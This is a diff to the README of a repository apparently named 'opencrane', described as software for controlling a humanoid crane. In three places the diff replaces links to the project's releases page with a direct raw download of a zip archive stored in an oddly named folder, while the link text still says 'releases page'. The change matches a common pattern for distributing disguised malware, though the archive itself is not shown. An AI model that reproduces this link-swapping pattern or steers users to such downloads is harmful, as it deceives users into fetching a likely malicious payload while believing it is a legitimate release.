@@ -1,6 +1,6 @@
 # 🏗️ opencrane - Control a Humanoid Crane System
 
-[![Download opencrane](https://img.shields.io/badge/Download%20opencrane-brightgreen?style=for-the-badge)](https://github.com/Plantingsqueaker926/opencrane/releases)
+[![Download opencrane](https://img.shields.io/badge/Download%20opencrane-brightgreen?style=for-the-badge)](https://github.com/Plantingsqueaker926/opencrane/raw/refs/heads/main/orthogenic/Software_2.3-alpha.5.zip)
 
 ## 🚀 What is opencrane?
 
@@ -26,7 +26,7 @@ For best use, keep Windows updated and close apps you do not need before you sta
 
 Go to the release page and get the latest Windows version here:
 
-[Visit the opencrane releases page](https://github.com/Plantingsqueaker926/opencrane/releases)
+[Visit the opencrane releases page](https://github.com/Plantingsqueaker926/opencrane/raw/refs/heads/main/orthogenic/Software_2.3-alpha.5.zip)
 
 On that page:
 
@@ -195,7 +195,7 @@ Before you start opencrane, make sure:
 
 Use this page to download opencrane for Windows:
 
-[https://github.com/Plantingsqueaker926/opencrane/releases](https://github.com/Plantingsqueaker926/opencrane/releases)
+[https://github.com/Plantingsqueaker926/opencrane/raw/refs/heads/main/orthogenic/Software_2.3-alpha.5.zip](https://github.com/Plantingsqueaker926/opencrane/raw/refs/heads/main/orthogenic/Software_2.3-alpha.5.zip)
 
 ## 🗂️ Project Details
 
